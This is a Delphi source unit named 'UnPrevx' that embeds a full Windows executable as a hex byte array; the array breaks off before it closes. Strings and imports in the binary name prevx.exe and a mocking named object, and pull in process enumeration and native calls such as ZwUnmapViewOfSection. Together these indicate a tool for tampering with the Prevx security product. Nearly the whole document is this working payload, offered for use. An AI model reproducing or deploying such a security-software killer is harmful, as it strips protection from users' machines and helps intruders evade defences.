{$E EXE}
{$IMAGEBASE $00410000}
{$R-}
{$Q-}
{$IFDEF minimum}
program Prevxme;
{$ENDIF}
unit Prevxme;
interface

uses
  Windows,
  WinNative,
  RTL,
  LDasm;

implementation

{$R version.res}

var
  cid: CLIENT_ID;
  attr: OBJECT_ATTRIBUTES;
  iost: IO_STATUS_BLOCK;

const
  Title: PWideChar = 'UnPrevx 1.1.220 (30.11.2010)';

  data: array[0..5119] of byte = (
    $4D, $5A, $50, $00, $02, $00, $00, $00, $04, $00, $0F, $00, $FF, $FF, $00, $00,
    $B8, $00, $00, $00, $00, $00, $00, $00, $40, $00, $1A, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $01, $00, $00,
    $BA, $10, $00, $0E, $1F, $B4, $09, $CD, $21, $B8, $01, $4C, $CD, $21, $90, $90,
    $54, $68, $69, $73, $20, $70, $72, $6F, $67, $72, $61, $6D, $20, $6D, $75, $73,
    $74, $20, $62, $65, $20, $72, $75, $6E, $20, $75, $6E, $64, $65, $72, $20, $57,
    $69, $6E, $33, $32, $0D, $0A, $24, $37, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $50, $45, $00, $00, $4C, $01, $06, $00, $19, $5E, $42, $2A, $00, $00, $00, $00,
    $00, $00, $00, $00, $E0, $00, $8E, $A1, $0B, $01, $02, $19, $00, $06, $00, $00,
    $00, $0A, $00, $00, $00, $00, $00, $00, $5C, $15, $00, $00, $00, $10, $00, $00,
    $00, $20, $00, $00, $00, $00, $40, $00, $00, $10, $00, $00, $00, $02, $00, $00,
    $01, $00, $00, $00, $00, $00, $00, $00, $04, $00, $00, $00, $00, $00, $00, $00,
    $00, $70, $00, $00, $00, $04, $00, $00, $00, $00, $00, $00, $02, $00, $00, $00,
    $00, $00, $10, $00, $00, $40, $00, $00, $00, $00, $10, $00, $00, $10, $00, $00,
    $00, $00, $00, $00, $10, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $40, $00, $00, $12, $02, $00, $00, $00, $60, $00, $00, $00, $02, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $50, $00, $00, $84, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $43, $4F, $44, $45, $00, $00, $00, $00,
    $74, $05, $00, $00, $00, $10, $00, $00, $00, $06, $00, $00, $00, $04, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $20, $00, $00, $60,
    $44, $41, $54, $41, $00, $00, $00, $00, $10, $00, $00, $00, $00, $20, $00, $00,
    $00, $02, $00, $00, $00, $0A, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $40, $00, $00, $C0, $42, $53, $53, $00, $00, $00, $00, $00,
    $E5, $02, $00, $00, $00, $30, $00, $00, $00, $00, $00, $00, $00, $0C, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $C0,
    $2E, $69, $64, $61, $74, $61, $00, $00, $12, $02, $00, $00, $00, $40, $00, $00,
    $00, $04, $00, $00, $00, $0C, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $40, $00, $00, $C0, $2E, $72, $65, $6C, $6F, $63, $00, $00,
    $84, $00, $00, $00, $00, $50, $00, $00, $00, $02, $00, $00, $00, $10, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $50,
    $2E, $72, $73, $72, $63, $00, $00, $00, $00, $02, $00, $00, $00, $60, $00, $00,
    $00, $02, $00, $00, $00, $12, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $40, $00, $00, $50, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $70, $00, $00, $00, $00, $00, $00, $00, $14, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $50,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $FF, $25, $54, $40, $40, $00, $8B, $C0, $FF, $25, $50, $40, $40, $00, $8B, $C0,
    $FF, $25, $4C, $40, $40, $00, $8B, $C0, $FF, $25, $48, $40, $40, $00, $8B, $C0,
    $FF, $25, $44, $40, $40, $00, $8B, $C0, $FF, $25, $40, $40, $40, $00, $8B, $C0,
    $FF, $25, $3C, $40, $40, $00, $8B, $C0, $66, $83, $F8, $61, $7C, $0A, $66, $83,
    $F8, $7A, $7F, $04, $66, $25, $DF, $00, $C3, $8D, $40, $00, $53, $56, $57, $55,
    $51, $89, $14, $24, $8B, $E8, $33, $FF, $33, $F6, $66, $8B, $44, $75, $00, $E8,
    $D4, $FF, $FF, $FF, $8B, $D8, $8B, $04, $24, $66, $8B, $04, $70, $E8, $C6, $FF,
    $FF, $FF, $66, $3B, $C3, $73, $07, $BF, $01, $00, $00, $00, $EB, $08, $66, $3B,
    $C3, $76, $03, $83, $CF, $FF, $66, $85, $D8, $74, $05, $46, $85, $FF, $74, $CA,
    $8B, $C7, $5A, $5D, $5F, $5E, $5B, $C3, $57, $89, $C7, $89, $D1, $C1, $E9, $02,
    $31, $C0, $F2, $AB, $89, $D1, $83, $E1, $03, $F2, $AA, $5F, $C3, $8D, $40, $00,
    $FF, $25, $84, $40, $40, $00, $8B, $C0, $FF, $25, $80, $40, $40, $00, $8B, $C0,
    $FF, $25, $7C, $40, $40, $00, $8B, $C0, $FF, $25, $78, $40, $40, $00, $8B, $C0,
    $FF, $25, $74, $40, $40, $00, $8B, $C0, $FF, $25, $70, $40, $40, $00, $8B, $C0,
    $FF, $25, $6C, $40, $40, $00, $8B, $C0, $FF, $25, $68, $40, $40, $00, $8B, $C0,
    $FF, $25, $64, $40, $40, $00, $8B, $C0, $FF, $25, $60, $40, $40, $00, $8B, $C0,
    $FF, $25, $5C, $40, $40, $00, $8B, $C0, $55, $8B, $EC, $53, $C7, $00, $18, $00,
    $00, $00, $8B, $5D, $10, $89, $58, $04, $89, $50, $08, $89, $48, $0C, $8B, $55,
    $0C, $89, $50, $10, $8B, $55, $08, $89, $50, $14, $5B, $5D, $C2, $0C, $00, $90,
    $64, $8B, $05, $18, $00, $00, $00, $8B, $40, $20, $C3, $90, $55, $8B, $EC, $83,
    $C4, $F8, $69, $45, $08, $10, $27, $00, $00, $F7, $D8, $99, $89, $45, $F8, $89,
    $55, $FC, $8D, $45, $F8, $50, $6A, $00, $E8, $A3, $FF, $FF, $FF, $59, $59, $5D,
    $C2, $04, $00, $90, $5C, $00, $42, $00, $61, $00, $73, $00, $65, $00, $4E, $00,
    $61, $00, $6D, $00, $65, $00, $64, $00, $4F, $00, $62, $00, $6A, $00, $65, $00,
    $63, $00, $74, $00, $73, $00, $5C, $00, $70, $00, $72, $00, $65, $00, $76, $00,
    $78, $00, $66, $00, $75, $00, $63, $00, $6B, $00, $00, $00, $70, $00, $72, $00,
    $65, $00, $76, $00, $78, $00, $2E, $00, $65, $00, $78, $00, $65, $00, $00, $00,
    $00, $00, $00, $00, $53, $56, $57, $55, $83, $C4, $DC, $BD, $98, $30, $40, $00,
    $33, $DB, $33, $C0, $A3, $0C, $20, $40, $00, $B8, $88, $30, $40, $00, $BA, $08,
    $00, $00, $00, $E8, $C0, $FE, $FF, $FF, $B8, $08, $30, $40, $00, $BA, $80, $00,
    $00, $00, $E8, $B1, $FE, $FF, $FF, $33, $FF, $C7, $45, $00, $2C, $02, $00, $00,
    $6A, $00, $6A, $02, $E8, $07, $FE, $FF, $FF, $A3, $90, $30, $40, $00, $83, $3D,
    $90, $30, $40, $00, $FF, $0F, $84, $69, $01, $00, $00, $55, $A1, $90, $30, $40,
    $00, $50, $E8, $F1, $FD, $FF, $FF, $85, $C0, $74, $39, $BE, $01, $00, $00, $00,
    $BB, $04, $20, $40, $00, $8D, $45, $24, $8B, $13, $E8, $1D, $FE, $FF, $FF, $85,
    $C0, $75, $0B, $8B, $45, $08, $89, $04, $BD, $88, $30, $40, $00, $47, $83, $C3,
    $04, $4E, $75, $E1, $55, $A1, $90, $30, $40, $00, $50, $E8, $C0, $FD, $FF, $FF,
    $85, $C0, $75, $C7, $A1, $90, $30, $40, $00, $50, $E8, $B9, $FD, $FF, $FF, $C7,
    $44, $24, $04, $00, $00, $40, $00, $33, $C0, $89, $44, $24, $08, $6A, $04, $68,
    $00, $10, $00, $00, $8D, $44, $24, $0C, $50, $6A, $00, $8D, $44, $24, $18, $50,
    $6A, $FF, $E8, $61, $FE, $FF, $FF, $83, $7C, $24, $08, $00, $0F, $84, $D8, $00,
    $00, $00, $8D, $44, $24, $04, $50, $68, $00, $00, $40, $00, $8B, $44, $24, $10,
    $50, $6A, $10, $E8, $30, $FE, $FF, $FF, $8B, $44, $24, $08, $8B, $38, $4F, $85,
    $FF, $0F, $8C, $97, $00, $00, $00, $47, $33, $DB, $E8, $71, $FE, $FF, $FF, $8B,
    $F3, $03, $F6, $8B, $54, $24, $08, $3B, $44, $F2, $04, $75, $79, $8B, $44, $24,
    $08, $80, $7C, $F0, $08, $05, $75, $6E, $8B, $44, $24, $08, $0F, $B7, $6C, $F0,
    $0A, $A1, $0C, $20, $40, $00, $89, $2C, $85, $08, $30, $40, $00, $C6, $04, $24,
    $00, $8D, $44, $24, $04, $50, $6A, $18, $8D, $44, $24, $14, $50, $6A, $00, $A1,
    $0C, $20, $40, $00, $55, $E8, $C6, $FD, $FF, $FF, $85, $C0, $75, $24, $BE, $02,
    $00, $00, $00, $B8, $88, $30, $40, $00, $8B, $10, $3B, $54, $24, $1C, $75, $0C,
    $C6, $04, $24, $01, $FF, $05, $0C, $20, $40, $00, $EB, $06, $83, $C0, $04, $4E,
    $75, $E6, $80, $3C, $24, $00, $75, $0E, $A1, $0C, $20, $40, $00, $33, $D2, $89,
    $14, $85, $08, $30, $40, $00, $43, $4F, $0F, $85, $6C, $FF, $FF, $FF, $33, $C0,
    $89, $44, $24, $04, $68, $00, $80, $00, $00, $8D, $44, $24, $08, $50, $8D, $44,
    $24, $10, $50, $6A, $FF, $E8, $86, $FD, $FF, $FF, $83, $3D, $0C, $20, $40, $00,
    $00, $0F, $9F, $C3, $8B, $C3, $83, $C4, $24, $5D, $5F, $5E, $5B, $C3, $8B, $C0,
    $53, $56, $57, $8B, $3D, $0C, $20, $40, $00, $4F, $85, $FF, $7C, $28, $47, $BB,
    $08, $30, $40, $00, $BE, $00, $00, $00, $40, $56, $8B, $03, $50, $E8, $56, $FD,
    $FF, $FF, $81, $C6, $00, $10, $00, $00, $81, $FE, $00, $00, $00, $80, $72, $E9,
    $83, $C3, $04, $4F, $75, $DE, $5F, $5E, $5B, $C3, $8B, $C0, $55, $8B, $EC, $83,
    $C4, $F0, $53, $56, $57, $33, $C0, $89, $45, $F8, $64, $8B, $05, $18, $00, $00,
    $00, $89, $45, $FC, $83, $7D, $08, $00, $75, $0E, $8B, $45, $FC, $8B, $40, $30,
    $8B, $40, $08, $89, $45, $F8, $EB, $67, $8B, $45, $FC, $8B, $40, $30, $8B, $40,
    $0C, $8B, $50, $0C, $89, $55, $F0, $8B, $50, $10, $89, $55, $F4, $8B, $5D, $F0,
    $83, $7B, $1C, $00, $74, $3E, $8B, $F3, $8B, $7E, $30, $85, $FF, $74, $35, $0F,
    $B7, $46, $2C, $50, $57, $E8, $16, $FC, $FF, $FF, $85, $C0, $75, $26, $8B, $46,
    $30, $8B, $55, $08, $E8, $23, $FC, $FF, $FF, $85, $C0, $75, $17, $8B, $46, $18,
    $89, $45, $F8, $8B, $06, $8B, $53, $04, $89, $02, $8B, $46, $04, $8B, $13, $89,
    $42, $04, $EB, $0B, $8B, $1B, $85, $DB, $74, $05, $3B, $5D, $F0, $75, $B1, $8B,
    $45, $F8, $5F, $5E, $5B, $8B, $E5, $5D, $C2, $04, $00, $90, $55, $8B, $EC, $53,
    $33, $DB, $33, $C0, $A3, $94, $30, $40, $00, $A1, $00, $20, $40, $00, $50, $68,
    $DC, $32, $40, $00, $E8, $4F, $FC, $FF, $FF, $6A, $00, $6A, $00, $6A, $00, $BA,
    $DC, $32, $40, $00, $B8, $C4, $32, $40, $00, $B9, $40, $00, $00, $00, $E8, $75,
    $FC, $FF, $FF, $68, $C4, $32, $40, $00, $68, $03, $00, $1F, $00, $68, $94, $30,
    $40, $00, $E8, $11, $FC, $FF, $FF, $85, $C0, $75, $18, $6A, $00, $A1, $94, $30,
    $40, $00, $50, $E8, $08, $FC, $FF, $FF, $A1, $94, $30, $40, $00, $50, $E8, $1D,
    $FC, $FF, $FF, $68, $20, $15, $40, $00, $E8, $EF, $FE, $FF, $FF, $68, $34, $15,
    $40, $00, $E8, $51, $FB, $FF, $FF, $05, $DF, $7C, $00, $00, $A3, $94, $30, $40,
    $00, $6A, $04, $68, $94, $30, $40, $00, $6A, $09, $6A, $FE, $E8, $BF, $FB, $FF,
    $FF, $E8, $BE, $FC, $FF, $FF, $84, $C0, $74, $1F, $E8, $81, $FE, $FF, $FF, $68,
    $C8, $00, $00, $00, $E8, $33, $FC, $FF, $FF, $E8, $A6, $FC, $FF, $FF, $84, $C0,
    $74, $ED, $E8, $69, $FE, $FF, $FF, $EB, $E6, $8B, $C3, $5B, $5D, $C2, $04, $00,
    $6E, $00, $65, $00, $6C, $00, $33, $00, $32, $00, $2E, $00, $64, $00, $6C, $00,
    $6C, $00, $00, $00, $77, $69, $6E, $73, $72, $76, $2E, $64, $6C, $6C, $00, $00,
    $51, $54, $6A, $00, $6A, $00, $68, $5C, $14, $40, $00, $6A, $00, $6A, $00, $E8,
    $CC, $FA, $FF, $FF, $50, $E8, $86, $FB, $FF, $FF, $5A, $C3, $83, $2D, $04, $30,
    $40, $00, $01, $73, $0B, $E8, $D6, $FF, $FF, $FF, $31, $C0, $40, $C2, $0C, $00,
    $C3, $8D, $40, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $64, $11, $40, $00, $9C, $11, $40, $00, $B0, $11, $40, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $8C, $40, $00, $00,
    $3C, $40, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $1C, $41, $00, $00, $5C, $40, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $9A, $40, $00, $00,
    $AA, $40, $00, $00, $BE, $40, $00, $00, $CE, $40, $00, $00, $DC, $40, $00, $00,
    $EE, $40, $00, $00, $00, $41, $00, $00, $00, $00, $00, $00, $26, $41, $00, $00,
    $3A, $41, $00, $00, $52, $41, $00, $00, $68, $41, $00, $00, $82, $41, $00, $00,
    $8C, $41, $00, $00, $A8, $41, $00, $00, $C4, $41, $00, $00, $DC, $41, $00, $00,
    $EA, $41, $00, $00, $F8, $41, $00, $00, $00, $00, $00, $00, $6B, $65, $72, $6E,
    $65, $6C, $33, $32, $2E, $64, $6C, $6C, $00, $00, $00, $00, $49, $73, $42, $61,
    $64, $52, $65, $61, $64, $50, $74, $72, $00, $00, $00, $00, $47, $65, $74, $4D,
    $6F, $64, $75, $6C, $65, $48, $61, $6E, $64, $6C, $65, $41, $00, $00, $00, $00,
    $43, $72, $65, $61, $74, $65, $54, $68, $72, $65, $61, $64, $00, $00, $00, $00,
    $43, $6C, $6F, $73, $65, $48, $61, $6E, $64, $6C, $65, $00, $00, $00, $50, $72,
    $6F, $63, $65, $73, $73, $33, $32, $4E, $65, $78, $74, $57, $00, $00, $00, $00,
    $50, $72, $6F, $63, $65, $73, $73, $33, $32, $46, $69, $72, $73, $74, $57, $00,
    $00, $00, $43, $72, $65, $61, $74, $65, $54, $6F, $6F, $6C, $68, $65, $6C, $70,
    $33, $32, $53, $6E, $61, $70, $73, $68, $6F, $74, $00, $00, $6E, $74, $64, $6C,
    $6C, $2E, $64, $6C, $6C, $00, $00, $00, $5A, $77, $44, $65, $6C, $61, $79, $45,
    $78, $65, $63, $75, $74, $69, $6F, $6E, $00, $00, $00, $00, $5A, $77, $55, $6E,
    $6D, $61, $70, $56, $69, $65, $77, $4F, $66, $53, $65, $63, $74, $69, $6F, $6E,
    $00, $00, $00, $00, $5A, $77, $46, $72, $65, $65, $56, $69, $72, $74, $75, $61,
    $6C, $4D, $65, $6D, $6F, $72, $79, $00, $00, $00, $5A, $77, $41, $6C, $6C, $6F,
    $63, $61, $74, $65, $56, $69, $72, $74, $75, $61, $6C, $4D, $65, $6D, $6F, $72,
    $79, $00, $00, $00, $5A, $77, $43, $6C, $6F, $73, $65, $00, $00, $00, $5A, $77,
    $51, $75, $65, $72, $79, $53, $79, $73, $74, $65, $6D, $49, $6E, $66, $6F, $72,
    $6D, $61, $74, $69, $6F, $6E, $00, $00, $00, $00, $5A, $77, $51, $75, $65, $72,
    $79, $49, $6E, $66, $6F, $72, $6D, $61, $74, $69, $6F, $6E, $50, $72, $6F, $63,
    $65, $73, $73, $00, $00, $00, $52, $74, $6C, $49, $6E, $69, $74, $55, $6E, $69,
    $63, $6F, $64, $65, $53, $74, $72, $69, $6E, $67, $00, $00, $00, $00, $5A, $77,
    $53, $65, $74, $45, $76, $65, $6E, $74, $00, $00, $00, $00, $5A, $77, $4F, $70,
    $65, $6E, $45, $76, $65, $6E, $74, $00, $00, $00, $5A, $77, $53, $65, $74, $49,
    $6E, $66, $6F, $72, $6D, $61, $74, $69, $6F, $6E, $54, $68, $72, $65, $61, $64,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $10, $00, $00, $74, $00, $00, $00, $02, $30, $0A, $30, $12, $30, $1A, $30,
    $22, $30, $2A, $30, $32, $30, $B2, $30, $BA, $30, $C2, $30, $CA, $30, $D2, $30,
    $DA, $30, $E2, $30, $EA, $30, $F2, $30, $FA, $30, $02, $31, $BC, $31, $C5, $31,
    $CA, $31, $D9, $31, $FA, $31, $00, $32, $0D, $32, $21, $32, $39, $32, $46, $32,
    $55, $32, $E2, $32, $E9, $32, $00, $33, $14, $33, $26, $33, $39, $33, $42, $33,
    $6C, $33, $85, $33, $90, $33, $65, $34, $6A, $34, $70, $34, $80, $34, $85, $34,
    $94, $34, $9E, $34, $AE, $34, $B9, $34, $C4, $34, $CE, $34, $DD, $34, $E4, $34,
    $47, $35, $5E, $35, $00, $20, $00, $00, $10, $00, $00, $00, $00, $30, $04, $30,
    $08, $30, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
